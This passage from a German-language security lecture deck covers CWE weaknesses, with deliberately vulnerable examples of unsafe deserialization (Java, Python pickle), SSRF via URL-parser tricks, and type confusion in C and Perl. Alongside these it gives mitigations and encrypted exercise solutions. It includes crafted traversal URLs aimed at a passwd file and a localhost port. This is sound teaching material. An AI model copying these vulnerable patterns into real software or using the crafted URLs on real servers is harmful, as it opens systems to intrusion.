</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace"></span><span class="keyword">try</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="whitespace"> </span><span class="name">FileInputStream</span><span class="whitespace"> </span><span class="name">fin</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="keyword">new</span><span class="whitespace"> </span><span class="name">FileInputStream</span><span class="punctuation">(</span><span class="name">file</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace">    </span><span class="name">ObjectInputStream</span><span class="whitespace"> </span><span class="name">oin</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="keyword">new</span><span class="whitespace"> </span><span class="name">ObjectInputStream</span><span class="punctuation">(</span><span class="name">fin</span><span class="punctuation">)</span><span class="whitespace">
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="whitespace">    </span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln">5 </small><code data-lineno="5 "><span class="whitespace">    </span><span class="name">javax</span><span class="punctuation">.</span><span class="name attribute">swing</span><span class="punctuation">.</span><span class="name attribute">JButton</span><span class="whitespace"> </span><span class="name">button</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">javax</span><span class="punctuation">.</span><span class="name attribute">swing</span><span class="punctuation">.</span><span class="name attribute">JButton</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="name">oin</span><span class="punctuation">.</span><span class="name attribute">readObject</span><span class="punctuation">();</span><span class="whitespace">
</span></code><small class="ln">6 </small><code data-lineno="6 "><span class="whitespace">    </span><span class="punctuation">...</span><span class="whitespace">
</span></code><small class="ln">7 </small><code data-lineno="7 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
</aside>
<div class="supplemental docutils container">
<p>Im Java Beispiel wird ein Objekt aus einer Datei gelesen und in eine Variable vom Typ <code class="java"><span class="name">javax</span><span class="punctuation">.</span><span class="name attribute">swing</span><span class="punctuation">.</span><span class="name attribute">JButton</span></code> geschrieben. Der Typ des Objekts wird nicht geprüft. Es ist möglich, dass die Datei ein Objekt enthält, welches vom Typ <code class="java"><span class="name">javax</span><span class="punctuation">.</span><span class="name attribute">swing</span><span class="punctuation">.</span><span class="name attribute">JButton</span></code> ist, aber nicht die Eigenschaften hat, die ein Button haben sollte. In diesem Fall wird keine Exception geworfen, aber das Objekt kann nicht wie erwartet verwendet werden bzw. es kommt zur Ausführung von beliebigem Code.</p>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="20" data-exercise-title="20 - Deserialization of Untrusted Data in Python" id="ld-exercise-20">
<p class="ld-exercise-title rubric">Deserialization of Untrusted Data in Python</p>
<pre class="code Python literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword">class</span><span class="whitespace"> </span><span class="name class">ExampleProtocol</span><span class="punctuation">(</span><span class="name">protocol</span><span class="operator">.</span><span class="name">Protocol</span><span class="punctuation">):</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace"></span>    <span class="keyword">def</span><span class="whitespace"> </span><span class="name function">dataReceived</span><span class="punctuation">(</span><span class="name builtin pseudo">self</span><span class="punctuation">,</span> <span class="name">data</span><span class="punctuation">):</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace"></span>        <span class="comment single"># ... parse the incoming data and</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace"></span>        <span class="comment single"># after receiving headers, call confirmAuth() to authenticate</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace"></span>    <span class="keyword">def</span><span class="whitespace"> </span><span class="name function">confirmAuth</span><span class="punctuation">(</span><span class="name builtin pseudo">self</span><span class="punctuation">,</span> <span class="name">headers</span><span class="punctuation">):</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace"></span>        <span class="keyword">try</span><span class="punctuation">:</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace"></span>            <span class="name">token</span> <span class="operator">=</span> <span class="name">cPickle</span><span class="operator">.</span><span class="name">loads</span><span class="punctuation">(</span><span class="name">base64</span><span class="operator">.</span><span class="name">b64decode</span><span class="punctuation">(</span><span class="name">headers</span><span class="punctuation">[</span><span class="literal string single">'AuthToken'</span><span class="punctuation">]))</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace"></span>            <span class="keyword">if</span> <span class="operator word">not</span> <span class="name">check_hmac</span><span class="punctuation">(</span><span class="name">token</span><span class="punctuation">[</span><span class="literal string single">'signature'</span><span class="punctuation">],</span> <span class="name">token</span><span class="punctuation">[</span><span class="literal string single">'data'</span><span class="punctuation">],</span> <span class="name">getSecretKey</span><span class="punctuation">()):</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace"></span>                <span class="keyword">raise</span> <span class="name">AuthFail</span><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace"></span>            <span class="name builtin pseudo">self</span><span class="operator">.</span><span class="name">secure_data</span> <span class="operator">=</span> <span class="name">token</span><span class="punctuation">[</span><span class="literal string single">'data'</span><span class="punctuation">]</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace"></span>        <span class="keyword">except</span><span class="punctuation">:</span><span class="whitespace">
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="whitespace"></span>            <span class="keyword">raise</span> <span class="name">AuthFail</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:G5kPP3MV0uVQzn2gbVX0WtVSWzMphxAPfz4bT1R67no=:GZlzj8t86uxMQN4Q:Eh09Vdy2MORTE1q53gZK+jR+UivH8gO+Jh31VU5D/rkeN+nn75Mp21qRZyIY8MAjYYKpVrlNDqN2fIh0R4B/OqFrXSQxoBWfllxsSF7ke0nE+g4RFhSiDOMgelQ2FrIJFhWfrnhR+BicnpXOMMhxlSTeJtGWMx9CRTN7s9iPBrIfUJOPQHDfFsepK0zupYgnNiu4uFfUrHPQ2Cb0Sq2th0uyrrUzrAjJm46WgzYYJ4e2ev090Vn0YHlFeOwgQHZuLYcffnhBTTmMpMmbG3PQMVeCVKrDraH9GbF1WSmOi4T+7oToRlYKIWTZeIg+d9nO7VosqfIcD1rf4YcwK+vvduOTBhSblD6YH4FzlhcpFVQlcwm5qA8s7MFE9eac7TOJQSy3cK/m5mAdMvmbqQz1ENLtpjKaNdPD6UA7qpGh3tMO0rVGtEvHGYP2Z6Lxzix6fzF4mwZsFCtLqxoP0AftOo8REXM9GGJkoH1klvLWlcYlE80NIqJUvF7raJOFPdaNr6OjWO3mFVGYr6/3IZ5OqDrbCz06Enz9EzkR8MmSoITTC85VnRwYtyRWqXv9HCwYHs1YUgFVYgE56eBJrx6aYr30OqrMUuwPXTVwnNsvxw6+Jef4ukJ/UqrL+EtVwKjJg9qEEAUmlqFRnLAQqiilzcIslKEBEl3oMTGeisDP0SGAZzwM/tl3V40YRIiVCdLqmJGRtjIoAEKmlMMUIpv1i6A9cNjG0r4JvkPKi/LqN9mR3sstZwUP1Cs3hJToFzCmdQFO0cflv4SbtYwxzhrEOEALAiGRTO98KQzw+yl8D4jYCyx6Qq5LWWpNWxuamOBEHMHxtBIsHCozyBkJVbyuqNVwmoyKdDPo3xf46SUBi9bZGTX8nHhbkyV+N6d0OMk9hn+l+VH/qs+dCDuKNj7qTSqAu5iPPqCtwFb5PSIqAQcRdkbHiZmyRAPFs0r0JvdIeq4/HKrucNTfoTp8RIc6uFJtI8gzYlqj2eiu</div>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="simple">
<li><p>ggf. Einsatz von Signaturen, um sicherzustellen, dass der serialisierte Code nicht manipuliert wurde</p></li>
<li><p>Serialisiere nur Daten, die auch wirklich serialisiert werden müssen</p></li>
<li><p>Verwendung von sicheren Formaten (z. B. JSON)</p></li>
<li><p>statische Analyse</p></li>
</ul>
<div class="supplemental docutils container">
<p>Empfohlene Lektüre: <a class="reference external" href="https://portswigger.net/web-security/deserialization">Deserialization Vulnerabilities</a></p>
</div>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-918-server-side-request-forgery-ssrf">
<h2>CWE-918: Server-Side Request Forgery (SSRF)<a class="brackets" href="#footnote-3" id="footnote-reference-3" role="doc-noteref"><span class="fn-bracket">[</span>3<span class="fn-bracket">]</span></a></h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 30.0%" />
<col style="width: 30.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position in CWE</p></th>
<th class="head"><p>Position in KEV</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>19</p></td>
<td><p>(nicht in den Top 10)</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>19</p></td>
<td><p><a class="reference external" href="https://cwe.mitre.org/top25/archive/2023/2023_kev_list.html">#7</a></p></td>
</tr>
</tbody>
</table>
</div>
<aside class="footnote-list brackets">
<aside class="footnote brackets" id="footnote-3" role="doc-footnote">
<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-3">3</a><span class="fn-bracket">]</span></span>
<p>≈ <span class="ger">Serverseitige Anfragefälschung</span></p>
</aside>
</aside>
</ld-topic>
<ld-topic id="cwe-918-server-side-request-forgery">
<h2>CWE-918: Server-Side Request Forgery</h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Kurze Beschreibung<span class="colon">:</span></dt>
<dd><p>Der Webserver erhält eine URL oder eine ähnliche Anfrage und ruft den Inhalt dieser URL ab, stellt aber nicht sicher, dass die Anfrage an das erwartete Ziel gesendet wird.</p>
</dd>
<dt>Technologien<span class="colon">:</span></dt>
<dd><p>Webserver</p>
</dd>
<dt>Ausmaß<span class="colon">:</span></dt>
<dd><p>Vetraulichkeit, Integrität</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<object aria-label="Server-Side Request Forgery (SSRF)" data="images/ssrf.svg" role="img" type="image/svg+xml">
</object></ld-card><ld-card class="incremental">
<aside class="admonition example">
<p class="admonition-title">Beispiel</p>
<p>Unicode Handling Fehler <a class="brackets" href="#footnote-4" id="footnote-reference-4" role="doc-noteref"><span class="fn-bracket">[</span>4<span class="fn-bracket">]</span></a> im JavaScript NodeJS Framework</p>
<pre class="code JavaScript literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="keyword declaration">var</span><span class="whitespace"> </span><span class="name other">base</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string double">&quot;http://orange.tw/sandbox/&quot;</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace"></span><span class="keyword declaration">var</span><span class="whitespace"> </span><span class="name other">path</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name other">req</span><span class="punctuation">.</span><span class="name other">query</span><span class="punctuation">.</span><span class="name other">path</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace"></span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name other">path</span><span class="punctuation">.</span><span class="name other">indexOf</span><span class="punctuation">(</span><span class="literal string double">&quot;..&quot;</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="operator">==</span><span class="whitespace"> </span><span class="operator">-</span><span class="literal number float">1</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="comment single">// check for no directory traversal</span><span class="whitespace">
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="whitespace">    </span><span class="name other">http</span><span class="punctuation">.</span><span class="name other">get</span><span class="punctuation">(</span><span class="name other">base</span><span class="whitespace"> </span><span class="operator">+</span><span class="whitespace"> </span><span class="name other">path</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name other">callback</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">5 </small><code data-lineno="5 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
<div class="incremental docutils container">
<p>Beispiel URL (<em>U+FF2E Full width Latin capital letter N</em>):</p>
<pre class="code restructuredtext incremental literal-block"><code>http://orange.tw/sandbox/ＮＮ/passwd</code></pre>
<pre class="code restructuredtext incremental literal-block"><code>≙ http://orange.tw/sandbox/\xFF\x2E\xFF\x2E/passwd</code></pre>
<pre class="code restructuredtext incremental literal-block"><code>≙ http://orange.tw/sandbox/\x2E\x2E/passwd</code></pre>
<pre class="code restructuredtext incremental literal-block"><code>≙ http://orange.tw/sandbox/../passwd</code></pre>
</div>
<aside class="footnote-list brackets">
<aside class="footnote brackets" id="footnote-4" role="doc-footnote">
<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-4">4</a><span class="fn-bracket">]</span></span>
<p><a class="reference external" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">Exploiting URL Parsers</a></p>
</aside>
</aside>
</aside>
</ld-card><ld-card class="incremental">
<p class="rubric">URL Parser vs. Abfrage der URL in PHP (&gt; 7.0.13):</p>
<pre class="code javascript literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="name other">$url</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string single">'http://foo&#64;127.0.0.1⬜&#64;google.com:11211/'</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="comment single">// ⬜ is &quot;just&quot; a space</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace"></span><span class="name other">$parsed</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name other">parse_url</span><span class="punctuation">(</span><span class="name other">$url</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace"></span><span class="name other">var_dump</span><span class="punctuation">(</span><span class="name other">$parsed</span><span class="punctuation">[</span><span class="name other">host</span><span class="punctuation">]);</span><span class="whitespace"> </span><span class="comment single">// string(10) &quot;google.com&quot;</span><span class="whitespace">
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="whitespace"></span><span class="name other">var_dump</span><span class="punctuation">(</span><span class="name other">$parsed</span><span class="punctuation">[</span><span class="name other">port</span><span class="punctuation">]);</span><span class="whitespace"> </span><span class="comment single">// int(11211)</span><span class="whitespace">
</span></code><small class="ln">5 </small><code data-lineno="5 "><span class="whitespace"></span><span class="name other">curl</span><span class="punctuation">(</span><span class="name other">$url</span><span class="punctuation">);</span></code></pre>
<p>Ergebnis:</p>
<ul class="incremental-list simple">
<li><p><span class="docutils literal">curl</span> fragt die URL <span class="docutils literal">127.0.0.1:11211</span> ab.</p></li>
<li><p>D. h. <span class="docutils literal">curl</span> und php interpretieren die URL unterschiedlich.</p></li>
</ul>
</ld-card><ld-card class="incremental">
<p class="rubric">Variante: Blind SSRF</p>
<p>Bei <em>Blind SSRF</em>-Schwachstellen werden auch Back-End-HTTP-Anfragen an eine bereitgestellte URL gestellt, die Antwort der Back-End-Anfrage jedoch nicht an die Front-End-Antwort der Anwendung zurückgegeben.</p>
<div class="supplemental docutils container">
<p>Empfohlene Lektüre: <a class="reference external" href="https://portswigger.net/web-security/ssrf/blind">Blind Server-Side Request Forgery (SSRF)</a></p>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="simple">
<li><p>keine (Wieder-)Verwendung der Eingabe URL</p></li>
<li><p>sichere APIs</p></li>
<li><p>statische Analyse (insbesondere Datenflußanalysen)</p></li>
<li><p>Behandlung von Zugriffen von lokalen Maschinen sollte mit der gleichen sorgfalt überprüft werden wie Zugriffe von externen Maschinen; andernfalls können kritische SSRF Angriffe durchgeführt werden</p></li>
<li><p>Firewall/Network Policy, um Zugriff auf interne Systeme zu verhindern</p></li>
</ul>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-843-access-of-resource-using-incompatible-type-type-confusion">
<h2>CWE-843: Access of Resource Using Incompatible Type (<em>Type Confusion</em>)</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 30.0%" />
<col style="width: 30.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position in CWE</p></th>
<th class="head"><p>Position in KEV</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>(nicht in den Top 25)</p></td>
<td><p><a class="reference external" href="https://cwe.mitre.org/top25/archive/2024/2024_kev_list.html">#2</a></p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>(nicht in den Top 25)</p></td>
<td><p><a class="reference external" href="https://cwe.mitre.org/top25/archive/2023/2023_kev_list.html">#8</a></p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-843-type-confusion">
<h2>CWE-843: <em>Type Confusion</em></h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Beschreibung<span class="colon">:</span></dt>
<dd><p>Eine Anwendung initialisiert eine Ressource mit einem bestimmten Typ (z. B. Zeiger (<span class="eng">Pointer</span>), Objekt, etc.). Später wird auf die Ressource (Variable) dann mit einem anderen Typ zugegriffen.</p>
</dd>
<dt>Sprachen<span class="colon">:</span></dt>
<dd><p>insbesondere (aber nicht ausschließlich) C/C++; im Prinzip in jeder Sprache, die automatische Typkonvertierungen durchführt.</p>
</dd>
<dt>Ausmaß<span class="colon">:</span></dt>
<dd><p>Integrität, Verfügbarkeit, Vertraulichkeit</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="21" data-exercise-title="21 - Type Confusion in C" id="ld-exercise-21">
<p class="ld-exercise-title rubric">Type Confusion in C</p>
<pre class="code c literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="comment preproc">#define NAME_TYPE 1
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="comment preproc"></span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace"></span><span class="keyword">struct</span><span class="whitespace"> </span><span class="name class">MessageBuffer</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">msgType</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">                       </span><span class="keyword">union</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">name</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">nameID</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="punctuation">};</span><span class="whitespace"> </span><span class="punctuation">};</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace"></span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name function">main</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">argc</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">**</span><span class="name">argv</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">    </span><span class="keyword">struct</span><span class="whitespace"> </span><span class="name class">MessageBuffer</span><span class="whitespace"> </span><span class="name">buf</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace">    </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">defaultMessage</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string">&quot;Hello World&quot;</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace">    </span><span class="name">buf</span><span class="punctuation">.</span><span class="name">msgType</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">NAME_TYPE</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace">    </span><span class="name">buf</span><span class="punctuation">.</span><span class="name">name</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">defaultMessage</span><span class="punctuation">;</span><span class="whitespace">              </span><span class="comment single">// printf(&quot;*buf.name %p&quot;, buf.name);
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="comment single"></span><span class="whitespace">    </span><span class="name">buf</span><span class="punctuation">.</span><span class="name">nameID</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="keyword type">int</span><span class="punctuation">)(</span><span class="name">defaultMessage</span><span class="whitespace"> </span><span class="operator">+</span><span class="whitespace"> </span><span class="literal number integer">1</span><span class="punctuation">);</span><span class="whitespace"> </span><span class="comment single">// printf(&quot;*buf.name %p&quot;, buf.name);
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="comment single"></span><span class="whitespace">    </span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">buf</span><span class="punctuation">.</span><span class="name">msgType</span><span class="whitespace"> </span><span class="operator">==</span><span class="whitespace"> </span><span class="name">NAME_TYPE</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;%s</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">buf</span><span class="punctuation">.</span><span class="name">name</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace">    </span><span class="keyword">else</span><span class="whitespace">                          </span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;ID %d</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">buf</span><span class="punctuation">.</span><span class="name">nameID</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
<p>Welche Ausgabe erzeugt das Programm?</p>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:ocvcRFgIuEoBqZlonrVzhZbj3Vd7ZqiX3Nd5Xh8H1R4=:uDgA4qZ65v5EOj6j:63zh7NoCJsb3VdZyehYDB0kmqwERMvM2mGPtatfiQfQ71iuunKhjI4bwIeaPtA/fG78Xp+rbbna3Jt33FhCdXqV8Z4AtZOkm9HbaH6hwzyChm3YAOMuC3pBnyfk4H4gQIeTaf8nssU5TEdsubfIZnOCHtROdxbGuTLAxChgtkiRx4b+6wnWA/W4T3wGdZdn9VsFmRT0191eh66dq0MaJgKwPCgXZ4TsI2wsayXHsDI4jwO0Ym9RF5Dn3AoZiGxZD4Cy2AovHqEwWQ+J50yjzA6Qr/oOE/1rlhm0VLCq1IIelHavY2+99IjmAiPmstoU43A22YLp7Huif+uVpUCEQCz5evAI3paZbTWJwBdw3XFK5BR2YEDhmz+/iOqfxuFGnCleTGcsE/txsAFgQcgCeHVUh3ULLZgrlZdfErPmWR+j8VTZpa6xUBznZVzNvqui4i6CIxOlCdmp+HfRgvc/Gu/jNi1DwnjfqIbmcxAM9OGA4O35gkq0Nuav+Cto/y3iaF6BcCI23kv2ghJa9kDfEt3kQKfpstugEPs9WScrO4PmIKwzZWTw2SGN9oKpqXiR4QZ9UGxtk+igr5iBdwrQ9MSGyEdNoQWZuZpyIChvXv1Wl8Gi/vAVO61u0PYUMwGM=</div>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="22" data-exercise-title="22 - Type Confusion in Perl" id="ld-exercise-22">
<p class="ld-exercise-title rubric">Type Confusion in Perl</p>
<pre class="code perl literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword">my</span><span class="whitespace"> </span><span class="name variable">$UserPrivilegeArray</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">[</span><span class="literal string">&quot;user&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="literal string">&quot;user&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="literal string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="literal string">&quot;user&quot;</span><span class="punctuation">];</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace"></span><span class="keyword">my</span><span class="whitespace"> </span><span class="name variable">$userID</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">get_current_user_ID</span><span class="punctuation">();</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace"></span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name variable">$UserPrivilegeArray</span><span class="whitespace"> </span><span class="operator word">eq</span><span class="whitespace"> </span><span class="literal string">&quot;user&quot;</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">    </span><span class="keyword">print</span><span class="whitespace"> </span><span class="literal string">&quot;Regular user!\n&quot;</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace"></span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace"></span><span class="keyword">else</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">    </span><span class="keyword">print</span><span class="whitespace"> </span><span class="literal string">&quot;Admin!\n&quot;</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace"></span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace"></span><span class="keyword">print</span><span class="whitespace"> </span><span class="literal string">&quot;\$UserPrivilegeArray = $UserPrivilegeArray\n&quot;</span><span class="punctuation">;</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:QASJf5wzWY9AbtS1aUMu8jeE6GjkK6yQJY5RvdNW77g=:NGCjiVtvSZh2m3cn:UVBClrfHzLoPV/rGNTst63ACADXtrrs2WO04oYn0f4IIZg85/H0K60+RhCnAV+g8dLqY2ZnSm43ky3WsxPZjEwo1ZEdGQriYxFf6Z1oxV0ISj2/Z9p68H3ALMXWjU5JEbTpZUsVKAuNimlymeymKnezGw8N/5tH8GcvhydZ509rPCYOuXV5zuaR5gTx6Uneg9AszLfVm7KHifWPslz2Pd6MA4a4zDd3BuJoi864qP5egIMtC4UREHWqJD+AX5u6NU+bXEckZIP0hJQgfSppBwDSu9/He9G3ZOhVjB72H9L5xSjTDzGJxsTDab4e56/VWxrWIsRIBigd9c8CVnHCwSd8hAesNev0TrP4Hr9M4Xw9cwUGKw07uXwWCKQiwKDXI6D4QgLFosO4n41OpZlNei3TCKWn1p8vx9uDpQs1sjYpNwrVtYo2nQNcb/0FDaeZYK+Ev0KWP69q7zF9FEXt8L9joW+wQRPtqwu1KDjSf59At0LXcuCt0p5CDy5cTEGVHLfrqRRfMJ1aVCLjwXvsTfUq/zByr1NxGkcxq8SGSFm0iBsQN8Meg6rhj5BM6</div>
</div>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-306-missing-authentication-for-critical-function">
<h2>CWE-306: Missing Authentication for Critical Function</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 30.0%" />
<col style="width: 30.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position in CWE</p></th>
<th class="head"><p>Position in KEV</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#25</p></td>
<td><p><a class="reference external" href="https://cwe.mitre.org/top25/archive/2024/2024_kev_list.html">#7</a></p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#20</p></td>
<td><p><a class="reference external" href="https://cwe.mitre.org/top25/archive/2023/2023_kev_list.html">#10</a></p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-306-missing-authentication-for-critical-function-1">
